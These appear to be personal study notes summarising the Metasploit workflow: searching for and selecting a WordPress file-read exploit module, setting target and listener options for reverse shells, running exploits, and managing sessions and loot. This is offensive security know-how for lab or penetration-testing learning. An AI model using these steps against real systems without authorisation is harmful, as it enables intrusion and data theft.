**Category:** #Exploitation / #Framework
**Scope:** Vulnerability Research, Exploitation, and Post-Exploitation

---

## 🔍 Overview

> **Logic:** Metasploit is a modular framework. It separates the **Exploit** (the way in) from the **Payload** (what you do once inside). This allows you to mix and match tools for almost any scenario.

---

## ⚡ The Standard Workflow

### 1. Launch & Search

Start the console silently and find your entry point.
```
# -q: Quiet mode (removes the banner)
msfconsole -q

# Search by type and keywords
search type:exploit name:wordpress search simple backup
```

### 2. Module Selection

Select the tool by its index number (from search results) or the full path.
```
use 0  # or use exploit/unix/webapp/wp_simple_backup_file_read
```

### 3. Configuration

Check what the module needs and fill in the blanks.
```
show options
info        # Get detailed background on the exploit
```

|**Parameter**|**Command**|**Description**|
|---|---|---|
|**Target IP**|`set RHOSTS [IP]`|The Remote Host you are attacking.|
|**Target Port**|`set RPORT [Port]`|The service port on the target.|
|**Your IP**|`set LHOST [Your_IP]`|Usually your `tun0` IP for reverse shells.|
|**Global Set**|`setg RHOSTS [IP]`|Sets the IP for **all** modules in this session.|

---

## 🚀 Execution & Management

### 🏁 Running the Exploit

- **`check`**: Validates if the target is vulnerable **without** actually exploiting it (Highly recommended to avoid crashing services).
    
- **`run`** or **`exploit`**: Fires the payload.
    
- **`exploit -j`**: Runs the exploit in the "Background" as a job.
    

### 💰 Loot & Sessions

- **`sessions -l`**: List all active shells/metersploiter connections.
    
- **`sessions -i [ID]`**: Interact with a specific shell.
    
- **`loot`**: View all files, hashes, or flags gathered from the targets during the session.
    

---

## 🚩 Essential Variable Reference

- **`LPORT`**: The port on **your** machine to listen on (Default is often 4444).
    
- **`DEPTH`**: Used in Directory Traversal exploits to define how many levels to go up (e.g., `../../`).
    
- **`FILEPATH`**: The specific file you want to read or overwrite on the target.